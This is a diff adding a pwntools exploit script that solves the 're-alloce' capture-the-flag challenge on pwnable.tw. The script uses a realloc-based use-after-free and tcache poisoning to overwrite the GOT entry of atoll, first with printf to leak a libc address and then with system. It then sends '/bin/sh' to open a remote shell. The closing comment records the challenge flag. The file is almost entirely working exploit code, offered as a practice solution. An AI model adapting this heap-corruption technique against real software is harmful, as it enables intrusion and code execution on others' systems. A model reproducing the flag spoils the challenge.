@@ -1,0 +1,79 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+
+exe = ELF("./re-alloce")
+libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
+ld = ELF("./ld-2.29.so")
+# context.log_level='debug'
+# context.terminal = ["foot"]
+p = remote("chall.pwnable.tw", 10106)
+# p = process([exe.path])
+def gdbs():
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+
+
+def add(idx,size,content):
+    sla(":","1")
+    sa(":",str(idx))
+    sla(":",str(size))
+    sla(":",content)
+def dels(idx):
+    sla(":","3")
+    sa(":",str(idx))
+def realloc(idx,size,content):
+    sla(":","2")
+    sla(":",str(idx))
+    sla(":",str(size))
+    if size !=0:
+        sla(":",content)
+add(0,0x10,b"a")
+realloc(0,0,"")
+realloc(0,0x10,p64(exe.got.atoll))
+add(1,0x10,b"a")
+realloc(1,0x30,"a")
+dels(1)
+realloc(0,0x30,p64(exe.got.atoll))
+add(1,0x30,"a")
+realloc(0,0x40,"a")
+dels(0)
+realloc(1,0x40,"change fd and fk to make sure it can be free again")
+dels(1)
+
+
+add(0,0x30,p64(exe.plt.printf))# *(long int*)(exe.got.atoll) = exe.plt.printf
+# read doesn't leave null byte behind so we can leak libc address
+sla(":","1")
+sa(":","a"*8)
+p.recvuntil("a"*8)
+addr = u64(p.recvuntil("Invalid",drop=True).ljust(8,b"\0"))
+libc.address = addr - 0x1e5760
+log.info(f"base libc: {hex(libc.address)}")
+# custom payload again because atoll is now printf
+sla(":","1")
+sla(":","")
+sa(":","a"*0x10)
+sa(":",p64(libc.sym.system))
+# gdbs()
+sla(":","1")
+sa(":","/bin/sh\0")
+#FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
